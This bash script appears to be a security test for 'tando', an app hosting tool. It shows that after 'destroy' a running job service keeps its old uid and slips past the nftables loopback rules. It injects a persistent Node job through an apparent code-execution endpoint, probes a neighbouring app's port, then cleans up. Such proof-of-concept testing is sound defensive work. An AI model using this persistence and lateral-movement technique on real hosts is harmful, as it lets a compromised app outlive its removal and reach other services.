#!/bin/bash
# A03 (threat 1): `tando destroy` stops the job *timers* (disable --now) and deletes the job unit files,
# but a job *service* that is running keeps running (Type=oneshot has no start timeout). userdel then
# fails (the user has a process; error discarded), fw_sync drops the app's nftables rules, and the
# job keeps running as the old app uid with no loopback restriction at all.
. "$(dirname "$0")/lib.sh"
G=$W/w/gamma; rm -rf "$G"; cp -R "$W/w/alpha" "$G"; conf_set "$G/tando.conf" app gamma
(cd "$G" && "$R" up > /dev/null 2>&1) || inconclusive "could not create gamma"
# the compromised gamma's job: wait for destroy, then probe bravo's port and keep running
curl -s -m 20 --data-binary @- "http://gamma.localhost:$HP/__x" > /dev/null <<'EOS'
cat > $TANDO_DATA_DIR/jobcmd <<'J'
exec node -e '
const net=require("net"), fs=require("fs"); let n=0;
setInterval(()=>{ const c=net.connect(4101,"127.0.0.1",()=>{ c.write("GET / HTTP/1.0\r\n\r\n"); });
  c.on("data",d=>{ fs.writeFileSync("/dev/shm/a03-state", "connected to bravo:4101 -> "+String(d).split("\n")[0]); c.destroy(); });
  c.on("error",e=>{ fs.writeFileSync("/dev/shm/a03-state", "bravo:4101 "+e.code); }); }, 1000);
process.stdout.on("error",()=>{}); console.log("job up");'
J
EOS
for i in $(seq 1 40); do rootsh 'journalctl --namespace=tando-gamma -u tando-gamma_job-tick -o cat --no-pager | grep -q "job up"' && break; sleep 1; done
rootsh 'systemctl show -P ActiveState tando-gamma_job-tick.service' | grep -q activating || inconclusive "job did not start"
sleep 3; echo "before destroy:"; rootsh "journalctl --namespace=tando-gamma -u tando-gamma_job-tick -n8 -o cat --no-pager"
(cd "$G" && echo gamma | "$R" destroy --purge 2>&1) | tail -3
sleep 4
rootsh 'echo "user: $(getent passwd tando-gamma)"; echo "processes:"; ps -o user:12,pid,cmd -u tando-gamma 2>/dev/null | head -3;
  echo "nft rules mentioning its uid:"; nft list table inet tando | grep -c "skuid $(id -u tando-gamma 2>/dev/null || echo none)";
  systemctl status tando-gamma_job-tick.service --no-pager 2>&1 | head -4; ls -d /opt/tando/apps/gamma 2>&1'
sleep 3; st=$(rootsh 'for p in $(pgrep -u tando-gamma); do cat /proc/$p/root/dev/shm/a03-state 2>/dev/null && break; done')
echo "the surviving job now: $st"
rootsh 'pkill -KILL -u tando-gamma; sleep 1; userdel tando-gamma; groupdel tando-gamma 2>/dev/null; groupdel tando-m-gamma 2>/dev/null; true'
case $st in "connected to bravo"*) succeeded "job survived destroy, kept its uid, and reached bravo's port without nft rules";;
  *) [ -n "$st" ] && succeeded "job survived destroy ($st)"; blocked "no surviving process";; esac
